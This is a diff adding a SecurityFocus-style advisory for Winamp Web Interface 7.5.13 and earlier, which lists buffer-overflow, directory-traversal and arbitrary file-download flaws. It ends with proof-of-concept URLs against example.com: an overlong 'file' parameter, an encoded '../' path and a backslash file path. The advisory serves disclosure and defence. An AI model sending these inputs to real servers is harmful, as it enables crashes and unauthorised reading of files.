@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/21539/info
+
+Winamp Web Interface is prone to multiple remote vulnerabilities. These issues include:
+
+- Buffer-overflow issues
+- A directory-traversal issue
+- An arbitrary file-download issue
+- A denial-of-service issue
+- An information-disclosure issue 
+
+An attacker can exploit thse issues to execute arbitrary code within the context of the affected application, crash the affected application, deny service to legitimate users, download arbitrary files, and obtain sensitive information. Other attacks are also possible. 
+
+Winamp Web Interface 7.5.13 and prior versions are vulnerable to these issues.
+
+Buffer-overflow vulnerabilities:
+http://www.example.com/browse then insert an username longer than 100 chars
+http://www.example.com/dl?file=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+Directory-traversal:
+http://www.example.com/browse?path=%2f..%2f..%2f
+
+Arbitrary file-download vulnerability: 
+http://www.example.com/dl?file=\file.txt.
